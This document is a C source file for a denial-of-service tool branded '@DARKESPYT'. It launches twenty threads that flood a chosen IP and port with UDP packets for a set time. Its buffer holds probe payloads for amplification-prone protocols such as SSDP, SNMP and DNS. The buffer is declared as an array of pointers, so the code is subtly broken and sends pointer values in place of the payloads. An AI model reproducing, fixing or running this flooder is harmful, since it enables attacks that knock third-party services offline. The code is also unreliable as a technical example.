#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE (50 * 1024)
#define NUM_THREADS 20

typedef struct {
    char* ip;
    int port;
    int duration;
} udp_params_t;

void* send_udp_traffic(void* params) {
    udp_params_t* udp_params = (udp_params_t*) params;
    struct sockaddr_in server_addr;
    int sockfd;
    char *buffer[BUFFER_SIZE] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x02\x00\x00",
        "\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00",
        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x01\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
    };
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(udp_params->port);
    if (inet_pton(AF_INET, udp_params->ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        close(sockfd);
        pthread_exit(NULL);
    }
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < udp_params->duration) {
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (const struct sockaddr*) &server_addr, sizeof(server_addr)) < 0) {
            perror("Sendto failed");
            close(sockfd);
            pthread_exit(NULL);
        }
    }
    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return EXIT_FAILURE;
    }
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (port <= 0 || duration <= 0) {
        fprintf(stderr, "Invalid Data\n");
        return EXIT_FAILURE;
    }
    pthread_t threads[NUM_THREADS];
    udp_params_t udp_params = { ip, port, duration };
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_udp_traffic, (void*) &udp_params) != 0) {
            perror("Thread creation failed");
            return EXIT_FAILURE;
        }
    }
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_join(threads[i], NULL) != 0) {
            perror("Thread join failed");
            return EXIT_FAILURE;
        }
    }
    printf("Attack Completed By @DARKESPYT Binary [%s:%d for %d seconds]\n", ip, port, duration);
    return EXIT_SUCCESS;
}
